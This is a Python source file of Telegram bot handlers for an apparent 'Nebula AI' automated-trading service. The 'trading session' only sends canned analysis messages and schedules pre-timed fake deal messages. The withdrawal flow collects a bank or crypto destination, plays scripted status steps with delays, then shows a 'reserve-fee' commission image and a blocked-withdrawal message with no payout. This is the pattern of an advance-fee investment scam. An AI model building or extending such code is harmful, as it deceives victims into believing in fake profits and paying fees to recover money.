import asyncio

from aiogram import Router, F
from aiogram.filters import StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, FSInputFile, Message, ReplyKeyboardRemove
from arq import ArqRedis

from app.keyboards.user import (
    BTN_BACK,
    BTN_CRYPTO,
    BTN_HISTORY,
    BTN_IBAN,
    BTN_START_SESSION,
    BTN_START_TRADING,
    BTN_WITHDRAW,
    BTN_WITHDRAW_CONFIRM,
    CB_SUSPENDED_CLOSE,
    CB_SUSPENDED_HELP,
    CB_SUSPENDED_HISTORY,
    CB_SUSPENDED_WITHDRAW,
    back_kb,
    confirm_withdraw_kb,
    post_session_kb,
    suspended_back_kb,
    suspended_menu_kb,
)
from app.menu import (
    HISTORY,
    MAIN_MENU,
    SESSION,
    WITHDRAW,
    WITHDRAW_COMMISSION_IMAGE,
    WITHDRAW_PROMPTS,
    WITHDRAW_REQUEST_RECEIVED,
    WITHDRAW_STATUS_STEPS,
    confirm_withdraw_text,
    go_back,
    show_screen,
    trade_history_text,
    withdraw_blocked_text,
    withdraw_suspended_text,
)
from app.services.scheduler.tasks.message import DEAL_START_DELAYS
from app.sql.repo import Repo
from app.states.user import Withdraw

router = Router()

SESSION_STARTED_TEXT = (
    "<b>🚀 Trading Session Started</b>\n\n"
    "Nebula AI has started preparing your trading session.\n"
    "Current process:\n"
    "🔹 Analysing market conditions\n"
    "🔹 Scanning available trading assets\n"
    "🔹 Checking liquidity and volatility\n"
    "🔹 Selecting the most suitable trading strategy\n"
    "🔹 Preparing automated trade execution\n"
    "🔹 Activating risk-control system\n"
    "Status: <b>Market Analysis in Progress...</b>"
)

ANALYSIS_COMPLETED_TEXT = (
    "<b>🔍 Market Analysis Completed</b>\n\n"
    "Nebula AI has completed the first stage of market analysis.\n"
    "Current result:\n"
    "🔹 Market conditions detected\n"
    "🔹 Trading opportunities found\n"
    "🔹 Strategy selected\n"
    "🔹 Risk profile applied\n"
    "🔹 AI execution module activated\n"
    "The system is now waiting for the best entry point\n"
    "Status: <b>Searching for Entry Point...</b>"
)

SESSION_ALREADY_USED_TEXT = (
    "⚠️ Your trading session has already been used.\n\n"
    "This access plan allows a single automated trading session, "
    "which has already been started."
)


@router.message(F.text == BTN_START_TRADING)
async def start_trading_session(message: Message, state: FSMContext, repo: Repo):
    user = await repo.user.get_user_by_id(message.from_user.id)  # type: ignore
    if user and user.session_used:
        await message.answer(SESSION_ALREADY_USED_TEXT, reply_markup=post_session_kb())
        return
    await show_screen(message, state, repo, SESSION)


@router.message(F.text == BTN_HISTORY)
async def trading_history(message: Message, state: FSMContext, repo: Repo):
    # Top-level menu action: reset nav so Back returns to the main menu.
    await state.update_data(nav_stack=[MAIN_MENU, HISTORY])
    await show_screen(message, state, repo, HISTORY, push=False)


@router.message(F.text == BTN_WITHDRAW)
async def withdraw_funds(message: Message, state: FSMContext, repo: Repo):
    # Top-level menu action: reset nav so Back returns to the main menu.
    await state.update_data(nav_stack=[MAIN_MENU, WITHDRAW])
    await show_screen(message, state, repo, WITHDRAW, push=False)


async def _start_withdraw_method(
    message: Message, state: FSMContext, method: str
) -> None:
    # Shared entry for both methods: remember the choice and ask for the address.
    await state.update_data(withdraw_method=method)
    await state.set_state(Withdraw.address)
    await message.answer(WITHDRAW_PROMPTS[method], reply_markup=back_kb())


@router.message(F.text == BTN_IBAN)
async def withdraw_iban_start(message: Message, state: FSMContext, repo: Repo):
    await _start_withdraw_method(message, state, "IBAN")


@router.message(F.text == BTN_CRYPTO)
async def withdraw_crypto_start(message: Message, state: FSMContext, repo: Repo):
    await _start_withdraw_method(message, state, "CRYPTO")


@router.message(Withdraw.address, F.text == BTN_BACK)
async def withdraw_address_back(message: Message, state: FSMContext, repo: Repo):
    # Back from the address prompt returns to the withdrawal-method screen.
    await state.set_state(None)
    await state.update_data(nav_stack=[MAIN_MENU, WITHDRAW])
    await show_screen(message, state, repo, WITHDRAW, push=False)


@router.message(Withdraw.address, F.text)
async def withdraw_address_received(message: Message, state: FSMContext, repo: Repo):
    # Save the entered destination and show the confirmation screen.
    destination = message.text.strip()  # type: ignore
    data = await state.get_data()
    method = data.get("withdraw_method", "IBAN")
    await state.update_data(withdraw_destination=destination)
    await state.set_state(Withdraw.confirm)

    user = await repo.user.get_user_by_id(message.from_user.id)  # type: ignore
    amount = user.amount if user and user.amount else 80
    await message.answer(
        confirm_withdraw_text(amount, method, destination),
        reply_markup=confirm_withdraw_kb(),
    )


@router.message(Withdraw.confirm, F.text == BTN_BACK)
async def withdraw_confirm_back(message: Message, state: FSMContext, repo: Repo):
    # Back from the confirmation screen returns to the address prompt.
    data = await state.get_data()
    method = data.get("withdraw_method", "IBAN")
    await state.set_state(Withdraw.address)
    await message.answer(WITHDRAW_PROMPTS[method], reply_markup=back_kb())


@router.message(Withdraw.confirm, F.text == BTN_WITHDRAW_CONFIRM)
async def withdraw_confirm_submit(message: Message, state: FSMContext, repo: Repo):
    # The withdrawal flow ends here; clear the input state.
    await state.set_state(None)

    user = await repo.user.get_user_by_id(message.from_user.id)  # type: ignore
    amount = user.amount if user and user.amount else 80

    # A message carrying ReplyKeyboardRemove can't be edited, so send it, wait,
    # delete it, then send a fresh message we can edit through the status steps.
    received = await message.answer(
        WITHDRAW_REQUEST_RECEIVED, reply_markup=ReplyKeyboardRemove()
    )
    await asyncio.sleep(5)
    await received.delete()

    status = await message.answer(WITHDRAW_STATUS_STEPS[0])
    for step in WITHDRAW_STATUS_STEPS[1:]:
        await asyncio.sleep(5)
        await status.edit_text(step)

    # Finally, the reserve-fee suspension image with its plan-specific caption
    # and the inline menu (Contact Manager / History / Withdraw / Help).
    await asyncio.sleep(5)
    image_path = WITHDRAW_COMMISSION_IMAGE.get(amount, WITHDRAW_COMMISSION_IMAGE[1000])
    await message.answer_photo(
        FSInputFile(image_path, filename="commission.jpg"),
        caption=withdraw_suspended_text(amount),
        reply_markup=suspended_menu_kb(),
    )


@router.callback_query(F.data == CB_SUSPENDED_HISTORY)
async def suspended_history(callback: CallbackQuery, repo: Repo):
    user = await repo.user.get_user_by_id(callback.from_user.id)
    amount = user.amount if user and user.amount else 80
    await callback.message.answer(  # type: ignore
        trade_history_text(amount), reply_markup=suspended_back_kb()
    )
    await callback.answer()


@router.callback_query(F.data == CB_SUSPENDED_WITHDRAW)
async def suspended_withdraw(callback: CallbackQuery, repo: Repo):
    user = await repo.user.get_user_by_id(callback.from_user.id)
    amount = user.amount if user and user.amount else 80
    await callback.message.answer(  # type: ignore
        withdraw_blocked_text(amount), reply_markup=suspended_back_kb()
    )
    await callback.answer()


@router.callback_query(F.data == CB_SUSPENDED_HELP)
async def suspended_help(callback: CallbackQuery):
    # No dedicated Help content yet; just acknowledge so the button doesn't hang.
    await callback.answer()


@router.callback_query(F.data == CB_SUSPENDED_CLOSE)
async def suspended_close(callback: CallbackQuery):
    # Back on a sub-screen: remove it, returning the user to the menu above.
    await callback.message.delete()  # type: ignore
    await callback.answer()


@router.message(F.text == BTN_BACK, StateFilter(None))
async def back(message: Message, state: FSMContext, repo: Repo):
    # One handler for every Back button: pops one screen off the nav stack.
    # Skipped while an input flow (e.g. withdrawal) owns Back via its own state.
    await go_back(message, state, repo)


@router.message(F.text == BTN_START_SESSION)
async def start_session(
    message: Message, state: FSMContext, repo: Repo, redis: ArqRedis
):
    user = await repo.user.get_user_by_id(message.from_user.id)  # type: ignore
    if user and user.session_used:
        await message.answer(SESSION_ALREADY_USED_TEXT, reply_markup=post_session_kb())
        return

    # Mark it used before scheduling so the session can only ever run once.
    await repo.user.mark_session_used(message.from_user.id)  # type: ignore

    # Same for every plan. Remove the keyboard while the session is running.
    await message.answer(SESSION_STARTED_TEXT, reply_markup=ReplyKeyboardRemove())
    # await asyncio.sleep(15)
    await message.answer(ANALYSIS_COMPLETED_TEXT)

    plan = user.amount if user and user.amount in DEAL_START_DELAYS else 80

    # Schedule the trade chain; each job re-enqueues the next one.
    await redis.enqueue_job(
        "send_deals",
        message.chat.id,
        plan,
        0,
        _defer_by=DEAL_START_DELAYS[plan] / 1000,
    )
